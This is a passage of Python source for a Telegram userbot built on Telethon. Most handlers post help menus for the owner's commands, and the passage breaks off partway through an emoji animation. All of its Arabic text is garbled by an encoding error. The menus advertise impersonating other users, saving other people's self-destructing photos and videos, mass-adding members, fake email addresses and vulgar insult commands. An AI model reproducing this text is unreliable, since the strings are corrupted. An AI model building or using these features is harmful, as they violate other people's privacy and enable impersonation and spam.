@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ5'))
async def show_m5_commands(event):
    await event.delete()
    m5_text = """
‚ïÆ‚Ä¢‚ùê ÿßŸàÿßŸÖŸÄÿ± ÿßŸÑÿ™ÿ≥ŸÑŸäŸÄŸá ŸàÿßŸÑŸÉÿßÿ±ŸäŸÉÿ™ŸÄÿ±  ‚¶Ç 
 ‚Ä¢ `.ŸÖÿ™ÿ™` ‚ò≠ ‚Ä¢ `.ÿßŸÜÿ™ÿ≠ÿßÿ±`Ÿà‚ò≠ ‚Ä¢ `.ÿ¥ÿ±Ÿäÿ±` ‚ò≠ ‚Ä¢ `.ÿ∫ÿ®Ÿä` ‚ò≠ ‚Ä¢ `.ÿ™ÿ±ÿ≠Ÿäÿ®` ‚ò≠ ‚Ä¢ `.Ÿàÿ≠ÿ¥` ‚ò≠ ‚Ä¢ `.ŸÇÿßÿ™ŸÑ`‚ò≠ ‚Ä¢ `.ŸÖÿ≥ÿØÿ≥` ‚ò≠ ‚Ä¢ `.ŸÉŸÑÿ®` ‚ò≠ ‚Ä¢ `.ŸáŸÑŸà`‚ò≠ ‚Ä¢ `.ÿ´ÿπÿ®ÿßŸÜ` ‚ò≠ ‚Ä¢ `.ÿØÿ≥ ŸÑÿßŸäŸÉ` ‚ò≠ ‚Ä¢ `.ÿßÿ¥ÿßÿ±ÿ©` ‚ò≠ ‚Ä¢ `.ÿ¥ÿ±ÿ∑ÿ©` ‚ò≠ ‚Ä¢ `.ÿßÿ≠ŸÖ` ‚Ä¢ `.ÿßÿ≠ÿ®ŸÉ` ‚Ä¢ `.ÿ´ŸÑÿ¨` ‚Ä¢ `.ÿßŸÑÿ≥Ÿàÿ±ÿ≥` ‚Ä¢ `.ÿ≠ÿ®` ‚Ä¢ `.ÿ≥ÿ®ŸàŸÜÿ¨ ÿ®Ÿàÿ®` ‚Ä¢ `.ÿ∑ÿßÿ¶ÿ±Ÿá` ‚Ä¢ `.ÿµÿØŸÖŸá` ‚Ä¢ `.ŸÜÿßÿØŸÖ`  ‚Ä¢ `.ŸÇŸÜÿ®ŸÑÿ©`  

"""
    await event.reply(m5_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ6'))
async def show_m6_commands(event):
    await event.delete()
    m6_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿ®Ÿàÿ™ ŸàÿπÿØ [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ÿ±ÿßÿ™ÿ®`

 ‚Ä¢ `.ÿßŸäŸÇÿßŸÅ ÿ±ÿßÿ™ÿ®`

 ‚Ä¢ `.ÿ®ÿÆÿ¥Ÿäÿ¥`

 ‚Ä¢ `.ÿßŸäŸÇÿßŸÅ ÿ®ÿÆÿ¥Ÿäÿ¥`

 ‚Ä¢ `.ÿ≥ÿ±ŸÇÿ© (ÿßŸäÿØŸä ÿ¥ÿÆÿµ)`

 ‚Ä¢ `.ÿßŸäŸÇÿßŸÅ ÿ≥ÿ±ŸÇÿ©`

"""
    await event.reply(m6_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ7'))
async def show_m7_commands(event):
    await event.delete()
    m7_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿ™ÿ≠ŸÖŸäŸÑ [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ŸäŸàÿ™ŸäŸàÿ® (ÿπŸÜŸàÿßŸÜ ÿßŸÑŸÅŸäÿØŸäŸà)`

ŸÖŸÑÿßÿ≠ÿ∏ÿ© : ÿßÿ¨ÿπŸÑ ŸÇÿ®ŸÑ ŸÉŸÑ ÿßŸÖÿ± ŸÜŸÇÿ∑ÿ© ‚ù≤.‚ù≥
"""
    await event.reply(m7_text)
    
@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ8'))
async def show_m8_commands(event):
    await event.delete()
    m8_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑŸÖÿ¨ŸÖŸàÿπŸá [‚òÖ]‚îÅ‚îÅ‚îÅ>

 ‚Ä¢ `.ÿ™ŸÇŸäŸäÿØ | ÿ®ÿßŸÑÿ±ÿØ`

 ‚Ä¢ `.ÿßŸÑÿ∫ÿßÿ° ÿ™ŸÇŸäŸäÿØ | ÿ®ÿßŸÑÿ±ÿØ`

 ‚Ä¢ `.ÿßŸÑŸÖŸÇŸäÿØŸäŸÜ`
 
 ‚Ä¢ `.ŸÉÿ¥ŸÅ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ©`

"""
    await event.reply(m8_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ9'))
async def show_m9_commands(event):
    await event.delete()
    m9_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ [‚òÖ]‚îÅ‚îÅ‚îÅ>
‚Ä¢ `.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÖŸÑŸäÿßÿ±`
‚Ä¢ `.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑÿ¨ŸàŸÉÿ±`
‚Ä¢ `.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑÿπŸÇÿßÿ®`
‚Ä¢ `.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑÿπŸÇÿ±ÿ®`
‚Ä¢ `.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑÿπÿ±ÿ®`
‚Ä¢ `.ÿ™ÿ¨ŸÖŸäÿπ ÿØÿπŸÖŸÉŸÖ`
‚Ä¢ `.ÿ™ÿ¨ŸÖŸäÿπ ŸÉÿ±ÿ≥ÿ™ŸäÿßŸÜŸà`
‚Ä¢ `.ÿ™ÿ¨ŸÖŸäÿπ ŸÖŸáÿØŸàŸäŸàŸÜ`
‚Ä¢ `.ÿ™ÿ¨ŸÖŸäÿπ ÿßÿ≥ÿßÿ≥ŸäŸÑ`

‚Ä¢ .ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ  - ŸÑÿßŸäŸÇÿßŸÅ ÿ≠ÿßŸÑÿ© ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ 
```ŸÖŸÄŸÑÿßÿ≠ÿ∏ÿ© : Ÿäÿ¨ÿ® ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ŸÅŸä ŸÇŸÜŸàÿßÿ™ ÿßŸÑÿ®Ÿàÿ™ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿäÿ© ŸÇÿ®ŸÑ ÿ®ÿØÿ° ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ . ```
"""    
    await event.reply(m9_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ10'))
async def show_m10_commands(event):
    await event.delete()
    m10_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿÆÿ∑Ÿàÿ∑ [‚òÖ]‚îÅ‚îÅ‚îÅ>

1- `ÿÆÿ∑ ÿ∫ÿßŸÖŸÇ`  2- `ÿÆÿ∑ ŸÖÿ¥ÿ∑Ÿàÿ®`

3- `ÿÆÿ∑ ÿ±ŸÖÿ≤`  4- `ÿÆÿ∑ ÿ®ÿßŸäÿ´ŸàŸÜ`

5- `.ÿ∑ÿ®ÿßÿπÿ©` + ÿßŸÑŸÉŸÑŸÖÿ© ÿßŸà ÿßŸÑÿ¨ŸÖŸÑÿ© ÿßŸÑŸÖÿ±ÿßÿØ ÿßÿ±ÿ≥ÿßŸÑŸáÿß

ÿ¨ŸÖŸäÿπ ÿßŸÑÿÆÿ∑Ÿàÿ∑ ÿßÿπŸÑÿßŸá ÿ™ÿ™ŸàŸÇŸÅ ÿ®ŸÉÿ™ÿßÿ®ÿ© ŸÜŸÅÿ≥ ÿßŸÖÿ± ÿßŸÑÿ™ÿ¥ÿ∫ŸäŸÑ 

<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ™ÿ±ÿ¨ŸÖŸÄÿ© [‚òÖ]‚îÅ‚îÅ‚îÅ>

‚ñ™Ô∏é`.ŸÖÿ™ÿ±ÿ¨ŸÖ` + ÿ±ŸÖÿ≤ ÿßŸÑŸÑÿ∫ÿ© | ŸÖÿ´ÿßŸÑ .ŸÖÿ™ÿ±ÿ¨ŸÖ ar

ŸäŸÇŸàŸÖ Ÿáÿ∞ÿß ÿßŸÑÿßŸÖÿ± ÿ®ÿπÿØ ÿ™ŸÅÿπŸäŸÑŸá ÿ®ÿ™ÿ≠ŸàŸäŸÑ ÿßŸä ÿ¨ŸÖŸÑŸá ÿßŸÑŸâ ÿßŸÑŸÑÿ∫ÿ© ÿßŸÑŸÖÿ≠ÿØÿØŸá

‚ñ™Ô∏é`.ÿßŸäŸÇÿßŸÅ ÿßŸÑŸÖÿ™ÿ±ÿ¨ŸÖ` ŸÑÿßŸäŸÇÿßŸÅ ÿßŸÑÿÆÿØŸÖÿ©
"""
    await event.reply(m10_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ11'))
async def show_m11_commands(event):
    await event.delete()
    m11_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ™ŸÜÿµŸäÿ® [‚òÖ]‚îÅ‚îÅ‚îÅ>

‚ñ™Ô∏é `.ÿ¨ŸÑÿ≥ÿ© <ÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ>`: Ÿäÿ¨ÿ® ŸÉÿ™ÿßÿ®ÿ© ÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ ŸÖÿπ ÿ±ŸÖÿ≤ ÿßŸÑÿØŸàŸÑÿ© (ŸÖÿ´ÿßŸÑ: +964770000.). 


‚ñ™Ô∏é `.ÿ±ŸÖÿ≤ <ÿßŸÑŸÉŸàÿØ>`: ÿ∂ÿπ ŸÖÿ≥ÿßŸÅÿ© ÿ®ŸäŸÜ ÿßŸÑÿßÿ±ŸÇÿßŸÖ  (ŸÖÿ´ÿßŸÑ: .ÿ±ŸÖÿ≤ 1 2 3 4 ).


‚ñ™Ô∏é `.ÿ™ÿ≠ŸÇŸÇ <ŸÉŸÑŸÖÿ© ÿßŸÑŸÖÿ±Ÿàÿ±>`:  ÿ®ÿßÿ≥ŸàŸàÿ±ÿØ ÿßŸÑÿ™ÿ≠ŸÇŸÇ ÿ®ÿÆÿ∑Ÿàÿ™ŸäŸÜ. (ŸÖÿ´ÿßŸÑ : .ÿ™ÿ≠ŸÇŸÇ gggg)

‚ñ™Ô∏é||ŸÖŸÄŸÑÿßÿ≠ÿ∏ÿ© ŸÑÿßŸäŸÖŸÉŸÜŸÉ ÿßŸÑÿ™ŸÜÿµŸäÿ® ŸÑÿßÿ¥ÿÆÿßÿµ ÿßÿÆÿ±ŸäŸÜ ÿßŸÑÿß ÿßÿ∞ÿß ŸÉŸÜÿ™ ÿßŸÑŸÖÿßŸÑŸÉ ÿßŸÑÿ≠ŸÇŸäŸÇŸä ŸÑŸÑÿ≥Ÿäÿ±ŸÅÿ±. 
"""
    await event.reply(m11_text)


@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ12'))
async def show_m12_commands(event):
    await event.delete()
    m12_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑŸÖÿ∫ÿßÿØÿ±ÿ© [‚òÖ]‚îÅ‚îÅ‚îÅ>
‚ñ™Ô∏é `.ŸÖÿ∫ÿßÿØÿ±ÿ© ÿßŸÑŸÇŸÜŸàÿßÿ™'`
ŸÑŸÖÿ∫ÿßÿØÿ±ÿ© ÿ¨ŸÖŸäÿπ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿ™Ÿä ÿ™ŸÖÿ™ŸÑŸÉŸáÿß ÿ®ÿßÿ≥ÿ™ÿ´ŸÜÿßÿ° ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿ™Ÿä ÿßŸÜÿ™ ŸÖÿßŸÑŸÉŸáÿß ÿßŸà ŸÖÿ¥ÿ±ŸÅ ŸÅŸäŸáÿß 

‚ñ™Ô∏é `.ŸÖÿ∫ÿßÿØÿ±ÿ© ÿßŸÑŸÉÿ±Ÿàÿ®ÿßÿ™`
ŸÑŸÖÿ∫ÿßÿØÿ±ÿ© ÿ¨ŸÖŸäÿπ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿ®ÿßÿ≥ÿ™ÿ´ŸÜÿßÿ° ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿßŸÑÿ™Ÿä ÿßŸÜÿ™ ŸÖÿßŸÑŸÉŸáÿß ÿßŸà ŸÖÿ¥ÿ±ŸÅ ŸÅŸäŸáÿß 
"""
    await event.reply(m12_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ13'))
async def show_m13_commands(event):
    await event.delete()
    m13_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ∞ÿßÿ™ŸäŸá [‚òÖ]‚îÅ‚îÅ‚îÅ>
        `.ÿ∞ÿßÿ™Ÿäÿ©`
‚ñ™Ô∏é Ÿäÿ≥ÿ™ÿÆÿØŸÖ ŸÑÿ≠ŸÅÿ∏ ÿßŸÑÿµŸàÿ± ŸàÿßŸÑŸÅŸäÿØŸäŸàŸáÿßÿ™ ÿßŸÑŸÖÿ§ŸÇÿ™ÿ© (ÿ®ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿµŸàÿ±ÿ©).

        `.ÿ≠ŸÅÿ∏ ÿßŸÑÿ∞ÿßÿ™Ÿäÿ©`
‚ñ™Ô∏é ÿ≥ŸäŸÇŸàŸÖ Ÿáÿ∞ÿß ÿßŸÑÿßŸÖÿ± ÿ®ÿπÿØ ÿ™ŸÅÿπŸäŸÑÿ© ÿ®ÿ≠ŸÅÿ∏ ÿßŸÑÿµŸàÿ± ŸàÿßŸÑŸÅŸäÿØŸäŸàŸáÿßÿ™ ÿßŸÑŸÖÿ§ŸÇÿ™Ÿá ÿ™ŸÑŸÇÿßÿ¶Ÿäÿß .
"""    
    await event.reply(m13_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ14'))
async def show_m14_commands(event):
    await event.delete()
    m14_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿßÿ∏ÿßŸÅÿ© [‚òÖ]‚îÅ‚îÅ‚îÅ>
        `.ÿ∂ŸäŸÅ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ•ÿ∂ÿßŸÅŸá ÿßŸÑÿßÿπÿ∂ÿßÿ° ÿßŸÑŸä ŸÉÿ±Ÿàÿ®ŸÉ ÿßŸà ŸÇŸÜÿßÿ™ŸÉ 

        `ÿßÿ∂ÿßŸÅÿ©_ÿ¨Ÿáÿßÿ™Ÿä`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ•ÿ∂ÿßŸÅÿ© ÿ¨Ÿáÿßÿ™ ÿßŸÑÿßÿ™ÿµÿßŸÑ ÿßŸÑÿÆÿßÿµŸá ÿ®ŸÉ Ÿàÿ®ÿ≥ÿ±ÿπŸá ŸÅÿßŸäŸÇŸá

``` ÿ™ŸÜÿ®ŸäŸá ŸÑÿß ÿ™ŸÑÿ≠ ÿ®ŸÑ ÿßŸÑÿßŸÖÿ± ŸÉÿ´ÿ± ÿ±ÿßÿ≠ ÿ™ŸÜÿ≠ÿ∏ÿ± ```
"""
    await event.reply(m14_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ15'))
async def show_m15_commands(event):
    await event.delete()
    m15_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ™ÿ≠ŸàŸäŸÑ [‚òÖ]‚îÅ‚îÅ‚îÅ>
        `.ÿ™ÿ≠ŸàŸäŸÑ ŸÜÿµ `
	ŸäŸÇŸàŸÖ ÿ®ÿ™ÿ≠ŸàŸäŸÑ ÿßŸÑŸÜÿµ ÿßŸÑŸä ŸÖŸÑÿµŸÇ
"""    
    await event.reply(m15_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ16'))
async def show_m16_commands(event):
    await event.delete()
    m16_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿ£ÿÆÿ±Ÿâ [‚òÖ]‚îÅ‚îÅ‚îÅ>
‚ñ™Ô∏é `.ÿ™ÿßÿ±ŸäÿÆŸá`
Ÿäÿ∏Ÿáÿ± ŸÑŸÉ ÿ™ÿßÿ±ŸäÿÆ ÿ£ŸÜÿ¥ÿ£ÿ° ÿßŸÑÿ≠ÿ≥ÿßÿ®

‚ñ™Ô∏é `.ÿßŸäŸÖŸäŸÑ ŸàŸáŸÖŸä`
ŸäŸÇŸàŸÖ ÿ®ÿπŸÖŸÑ ÿßŸäŸÖŸäŸÑ ŸàŸáŸÖŸä (ŸÖŸàŸÇÿ™)

‚ñ™Ô∏é `.ÿ≠ÿßŸÑÿ™Ÿä`
ŸäŸÇŸàŸÖ ÿ®ÿ•ÿ∏Ÿáÿßÿ± ÿßŸÜ ŸÉŸÜÿ™ ŸÖÿ≠ÿ∏Ÿàÿ± ÿßŸÖ ŸÑÿß 

‚ñ™Ô∏é `.ŸÖŸàÿØ ÿßŸÑÿ™ŸÉÿ®ÿ±`
ŸÖÿ´ÿßŸÑ ÿßŸÉÿ™ÿ® ÿßŸÑÿ™ŸÉÿ®ÿ± : ÿßŸÑÿπÿØÿØ

‚ñ™Ô∏é `.ŸÖŸàÿØ ÿßŸÑÿ™ŸÉÿ®ÿ± ÿ™ÿπÿ∑ŸäŸÑ`
ŸäŸÇŸàŸÖ ÿ®ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÖÿ± ÿßŸÑÿ™ŸÉÿ®ÿ± 

‚ñ™Ô∏é `.ÿßŸÑÿ™ŸÉÿ®ÿ± ÿ™ÿπÿ∑ŸäŸÑ`
ŸäŸÇŸàŸÖ ÿ®ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÖÿ± ÿßŸÑÿ™ŸÉÿ®ÿ± 

"""
    await event.reply(m16_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ17'))
async def show_m17_commands(event):
    await event.delete()
    m17_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ∞ŸÉÿßÿ° ÿßŸÑÿßÿµÿ∑ŸÜÿßÿπŸä [‚òÖ]‚îÅ‚îÅ‚îÅ>
		`.ÿ∞ŸÉÿßÿ°`
‚ñ™Ô∏é ŸÖÿ´ÿßŸÑ ÿßŸÉÿ™ÿ® .ÿ∞ŸÉÿßÿ° : ÿßŸÑÿ≥ÿ§ÿßŸÑ

		`.ÿßŸÑÿ∞ŸÉÿßÿ° ÿ™ŸÅÿπŸäŸÑ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑÿ∞ŸÉÿßÿ° ÿßŸÑÿßÿµÿ∑ŸÜÿßÿπŸä ŸÅŸä ÿ≠ÿ≥ÿßÿ®ŸÉ 

		`.ÿßŸÑÿ∞ŸÉÿßÿ° ÿ™ÿπÿ∑ŸäŸÑ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ•ŸäŸÇÿßŸÅ ÿßŸÑÿ∞ŸÉÿßÿ° ÿßŸÑÿßÿµÿ∑ŸÜÿßÿπŸä ŸÅŸä ÿßŸÑÿ≠ÿ≥ÿßÿ® 
"""    
    await event.reply(m17_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ18'))
async def show_m18_commands(event):
    await event.delete()
    m18_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑŸÇŸÜŸàÿßÿ™ [‚òÖ]‚îÅ‚îÅ‚îÅ>
‚ñ™Ô∏é `.ŸÇÿßÿ¶ŸÖŸá ŸÇŸÜŸàÿßÿ™Ÿä`
ŸäŸÇŸàŸÖ ÿ®Ÿä ÿßÿ∏Ÿáÿßÿ± ÿ¨ŸÖŸäÿπ ŸÇŸÜŸàÿßÿ™ŸÉ 

‚ñ™Ô∏é `.ŸÇÿßÿ¶ŸÖŸá ŸÉÿ±Ÿàÿ®ÿßÿ™Ÿä`
ŸäŸÇŸàŸÖ ÿ®ÿ•ÿ∏Ÿáÿßÿ± ÿ¨ŸÖŸäÿπ ŸÉÿ±Ÿàÿ®ÿßÿ™ŸÉ
"""
    await event.reply(m18_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ19'))
async def show_m19_commands(event):
    await event.delete()
    m19_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿßŸÑÿπÿßÿ® [‚òÖ]‚îÅ‚îÅ‚îÅ>
 `.ÿ®ŸÑŸä`
ÿπÿ®ÿßÿ±Ÿá ÿπŸÜ ÿßŸÑÿπÿßÿ® 

 `ÿ®Ÿàÿ≥ÿ©`
ŸÑÿß ÿØÿßÿπŸä
"""    
    await event.reply(m19_text)
    
@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ20'))
async def show_m20_commands(event):
    await event.delete()
    m20_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßÿ∂ÿßŸÅŸäŸá[‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `ŸÉÿ™ÿßÿ®ÿ© `+ ÿπÿØÿØ ÿßŸÑÿ´ŸàÿßŸÜŸä 
 = ŸÑÿ£ÿ∂Ÿáÿßÿ± ŸÉŸÑŸÖÿ© ŸäŸÉÿ™ÿ® .. ÿ®ÿ¥ŸÉŸÑ ŸàŸáŸÖŸä

 ‚Ä¢ `ŸÅŸäÿØ` + ÿπÿØÿØ ÿßŸÑÿ´ŸàÿßŸÜŸä 
 = ŸÑÿ£ÿ∏Ÿáÿßÿ± ÿ®ÿ£ŸÜŸÉ ÿ™ÿ±ÿ≥ŸÑ ŸÅŸäÿØŸäŸà ŸÅŸä ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© ÿßŸà ÿßŸÑÿÆÿßÿµ

 ‚Ä¢ `ŸÑÿπÿ®ÿ©` + ÿπÿØÿØ ÿßŸÑÿ´ŸàÿßŸÜŸä 
 = ŸÑÿ•ÿ∏Ÿáÿßÿ± ÿ®ÿ£ŸÜŸÉ ÿ™ŸÑÿπÿ® 

 ‚Ä¢ `ÿµŸàÿ™Ÿäÿ©` + ÿπÿØÿØ ÿßŸÑÿ´ŸàÿßŸÜŸä 
 = ŸÑÿ£ÿ∏Ÿáÿßÿ± ÿ®ÿ£ŸÜŸÉ ÿ™ÿ≥ÿ¨ŸÑ ÿ®ÿµŸÖÿ©
"""    
    await event.reply(m20_text)    

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ21'))
async def show_m21_commands(event):
    await event.delete()
    m21_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± 2 ÿßŸÑÿ™ÿ≥ŸÑŸäŸá [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ÿ®ŸÜÿ¨`
‚ñ™Ô∏é Ÿäÿπÿ±ÿ∂ ŸÑŸÉ ÿ≥ÿ±ÿπŸá ŸÜÿ™ŸÉ 

 ‚Ä¢ `.ÿßŸÜŸÖŸä`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®Ÿä ÿßŸÜÿ¥ÿßÿ° ÿµŸàÿ± ÿßŸÑÿßŸÜŸÖŸä 

 ‚Ä¢ `.ŸÉÿ™`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®Ÿä ÿßÿπÿ∑ÿßŸÉ ÿßÿ≥ÿßŸÑÿ© 

 ‚Ä¢ `.ÿπŸÉÿ≥`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿπŸÉÿ≥ ÿßŸÑŸÉŸÑÿßŸÖ ÿ®ÿ±ÿØ ÿπŸÑŸâ ÿßŸÑŸÉŸÑÿßŸÖ

 ‚Ä¢ `.ÿÆŸäÿ±ŸàŸÉ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ•ÿπÿ∑ÿßÿ° ÿÆŸäÿßÿ±ÿßÿ™ ÿßÿ≥ÿßŸÑŸá 
"""    
    await event.reply(m21_text)    

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ22'))
async def show_m22_commands(event):
    await event.delete()
    m22_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ®ÿµŸÖÿßÿ™[‚òÖ]‚îÅ‚îÅ‚îÅ>
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ÿ∫ŸÜŸäŸÑŸä`. Ô∏é 
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ÿ¥ÿπÿ±`   Ô∏é  
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ŸÇÿ±ÿßŸÜ`.   
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ÿ≤Ÿäÿ¨ ÿ≠ÿ≤ŸäŸÜ`
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ŸäÿπŸÜŸä ŸáŸÑ ÿÆÿ±Ÿá`
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ŸÑŸàŸÉŸä ÿ¥ÿØÿÆŸÑŸÉ`
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ÿßŸÑŸâ ŸÖÿ™Ÿâ`
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ÿßÿ≠ÿ∑ ÿ±ÿ¨ŸÑŸä`
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ÿ™ÿ®ÿß`
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ÿßŸÉŸÑ ÿÆÿ±ÿß`
"""    
    await event.reply(m22_text)    

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ23'))
async def show_m23_commands(event):
    await event.delete()
    m23_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ™ŸÇŸÑŸäÿØ ŸàÿßŸÑÿßŸÜÿ™ÿ≠ÿßŸÑ [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ÿ™ŸÅÿπŸäŸÑ ÿßŸÑÿ™ÿÆÿ≤ŸäŸÜ`

 ‚Ä¢ `.ÿßŸÜÿ™ÿ≠ÿßŸÑ | ÿ®ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ©`

 ‚Ä¢ `.ÿßÿ±ÿ¨ÿßÿπ`

 ‚Ä¢ `.ÿ™ŸÇŸÑŸäÿØ | ÿ®ÿßŸÑÿ±ÿØ`

 ‚Ä¢ `.ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ŸÇŸÑŸäÿØ`
"""    
    await event.reply(m23_text)    

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ24'))
async def show_m24_commands(event):
    await event.delete()
    m24_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ™ÿ≠ÿ¥Ÿäÿ¥ [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ÿ±ŸÅÿπ ŸÖÿ±ÿ™Ÿä`
 ‚Ä¢ `.ÿ±ŸÅÿπ ÿ¨ŸÑÿ®`
 ‚Ä¢ `.ÿ≤Ÿàÿßÿ¨`
 ‚Ä¢ `.ÿ∑ŸÑÿßŸÉ`
 ‚Ä¢ `.ÿ±ŸÅÿπ ÿßÿ®ŸÜ ŸÇÿ≠ÿ®ÿ©`
"""    
    await event.reply(m24_text)    

@client.on(events.NewMessage(from_users='me', pattern='.ÿ∫ÿ®Ÿä'))
async def dumb_brain(event):
    try:
        
        await event.delete()

        
        message_texts = [
            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\nüß†         <(^_^ <)üóë",
            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\nüß†       <(^_^ <)  üóë",
            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\nüß†     <(^_^ <)  üóë",
            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\nüß†   <(^_^ <)  üóë",
            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\nüß† <(^_^ <)  üóë",
            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\n  (> ^_^)>üß†       üóë",
            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\n    (> ^_^)>üß†     üóë",
